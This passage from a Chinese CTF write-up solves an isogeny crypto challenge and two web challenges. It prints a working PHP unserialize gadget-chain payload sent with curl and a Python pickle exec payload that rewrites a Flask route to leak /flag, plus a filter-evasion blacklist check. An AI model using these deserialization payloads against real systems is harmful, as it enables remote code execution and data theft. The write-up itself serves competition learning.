        # 尝试每个3-除点
        for point in P:
            try:
                phi = E.isogeny(point)
                E_new = phi.codomain()
                j_new = E_new.j_invariant()
                
                # 尝试解密
                flag = decrypt_flag(j_new)
                if flag:
                    print(f"\n找到flag! j_final = {j_new}")
                    print(f"Flag: {flag}")
                    exit()
            except Exception as e:
                # print(f"处理点 {point} 时出错: {e}")
                continue
    except Exception as e:
        print(f"处理j {j} 时出错: {e}")
        continue

print("未找到flag，请检查代码或尝试其他方法")
```

我们需要用SageMathShell来运行我们的sage文件

首先安装一些必要的依赖

```shell
sage -pip install PyCryptodome
```

然后运行解密程序

```shell
cd /cygdrive/c/Users/probie/Desktop/task
sage solve.sage
```

得到结果

```shell
寻找可能的magical_num值...
找到可能的j不变量: 4
找到可能的j不变量: 242
找到 2 个可能的j不变量

尝试j不变量: 4
找到 8 个3-除点

尝试j不变量: 242
找到 8 个3-除点
...
```

```shell
找到flag! j_final = 356
Flag: flag{I_@m_4_n31gh80r_0f_my53lf}
```

得出：flag{I_@m_4_n31gh80r_0f_my53lf}



## web

### **Path to Hero**

#### 解题过程

开启容器，查看源码，代码审计一下

发现它的主要考点是**魔术方法**，方法链条：

```
wakeup -> get -> toString -> call
```

① Start 类(wakeup)：设置$ishero = "heroabc"(包含hero但不等于hero)

② word 类(get)：条件`$test1 !== $test2`和`md5($test1) == md5($test2)`是一个很普通的MD5碰撞

**尝试**

`d41d8cd98f00b204e9800998ecf8427e`和`d41d8cd98f00b204e9800998ecf8427f` -> × 原因未知

`$test1 = [123]`和`$test2 = [456]` -> Null == Null -> （＾－＾）√ 碰碰撞撞

③ toString：正则匹配flag

**尝试**

print_r(file_get_contents('/flag')) -> × 过滤了吧，虽然执行了echo但没触发call

用`'/f'.'lag'`拼接成`/flag` -> print_r(file_get_contents('/f'.'lag')); -> （＾－＾）√ 成功绕过正则

④ call：反序列化 Payload 中，`$end`参数的命令需指定精准长度（如`s:39:"命令内容";`），长度错误会导致命令截断无法执行

print_r(file_get_contents('/f'.'lag')); 共 39 个字符，因此设置 `s:39:"print_r(file_get_contents('/f'.'lag'));";`

**构造并执行payload**

```cmd
curl -X POST -d "HERO=O:5:""Start"":2:{s:6:""ishero"";s:7:""heroabc"";s:9:""adventure"";O:5:""Sword"":3:{s:5:""test1"";a:1:{i:0;i:123;}s:5:""test2"";a:1:{i:0;i:456;}s:2:""go"";O:6:""Mon3tr"":2:{s:14:""%00Mon3tr%00result"";N;s:3:""end"";s:39:""print_r(file_get_contents('/f'.'lag'));"";}}}" http://challenge.ilovectf.cn:30750/
```

得到响应

```html
<br>勇者啊，去寻找利刃吧<br>
<br>沉睡的利刃被你唤醒了，是时候去讨伐魔王了！<br>
<br>到此为止了！魔王<br>
<br>结束了？<br>
<br>flag{ca3be76a-00e5-497f-883b-a21ca31b0668}<br>
```

得出：flag{ca3be76a-00e5-497f-883b-a21ca31b0668}



### **这又又是什么函数**

#### 解题过程

开启容器，查看前端源码

没什么特别的不过值得注意的是前端它将输入框的内容提交到了这个路由`/unpickel`后端根本没有这个路由，这也是前端不管提交什么都会报错的原因，正确的路由应该是`/deser`，所以我们需要用代码脚本来发送请求

然后根据题目查看拼接网址`/src`查看后端代码

```python
a = request.form.get('a')
decoded_data = base64.b64decode(a)
result = pickle.loads(decoded_data)
```

发现后端对我们请求的data的处理方式是直接pickle.loads这里存在pickle的反序列化漏洞，可利用执行任意恶意代码

我们可以通过重写 Flask 视图函数来拿到`/flag`的内容

生成base64的payload

```python
import pickle
import base64

class RewriteFunc:
    def __reduce__(self):
        server_code = """
import flask
app = flask.current_app  # 获取Flask应用实例
# 定义新的视图函数：读取/flag并返回
def new_deser():
    with open('/flag', 'rb') as f:
        flag = f.read().decode('utf-8').strip()
    return flag
# 替换全局路由函数：将原deser函数换成new_deser
app.view_functions['deser'] = new_deser
        """
        return (exec, (server_code.strip(),))

# 用Pickle协议0序列化（文本格式，无x80）
pickle_data = pickle.dumps(RewriteFunc(), protocol=0)

# 验证黑名单（确保无禁用字符）
blacklist = [b'eval', b'os', b'x80', b'before', b'after']
for forbidden in blacklist:
    assert forbidden not in pickle_data, f"触发黑名单：{forbidden.decode()}"
    
# Base64编码（符合题目输入要求）
encoded_payload = base64.b64encode(pickle_data).decode('utf-8')
print("payload:", encoded_payload)
```

然后得到我们的payload

```
Y21haW5fYWJpbmcKUmV3cml0ZUZ1bmMKcDAKKGRwMQpleGVjCihkczEKKCdpbXBvcnQgZmxhc2s7IGFwcCA9IGZsYXNrLmN1cnJlbnRfYXBwO2RlZiBuZXdfZGVzZXIoKTogd2l0aCBvcGVuKCcvZmxhZycsICdyYicpIGFzIGY6ZmxhZyA9IGYucmVhZCgpLmRlY29kZSgndXRmLTgnKS5zdHJpcCgpO3JldHVybiBmbGFnO2FwcC52aWV3X2Z1bmN0aW9uc1snZGVzZXInXSA9IG5ld19kZXNlcicpCnRwMgpScDMKLg==
```

发送我们的payload

```python
import requests

encoded_payload = "Y21haW5fYWJpbmcKUmV3cml0ZUZ1bmMKcDAKKGRwMQpleGVjCihkczEKKCdpbXBvcnQgZmxhc2s7IGFwcCA9IGZsYXNrLmN1cnJlbnRfYXBwO2RlZiBuZXdfZGVzZXIoKTogd2l0aCBvcGVuKCcvZmxhZycsICdyYicpIGFzIGY6ZmxhZyA9IGYucmVhZCgpLmRlY29kZSgndXRmLTgnKS5zdHJpcCgpO3JldHVybiBmbGFnO2FwcC52aWV3X2Z1bmN0aW9uc1snZGVzZXInXSA9IG5ld19kZXNlcicpCnRwMgpScDMKLg=="
url = "http://challenge.ilovectf.cn:30835/deser"
data = {"a": encoded_payload}
response = requests.post(url, data=data)
print("结果：", response.text)
```

返回了done代表后端执行了我们的payload

直接响应我们的flag

```python
import requests

response = requests.get("http://challenge.ilovectf.cn:30835/deser")
print(response.text)
```

得出：flag{e81bef15-0eaa-43c8-9bce-a8ab31faf555}



# 后记

## 赠言

### 好好吃饭，认真睡觉。感谢相遇，铭记学习。——菜鸟也要学晚安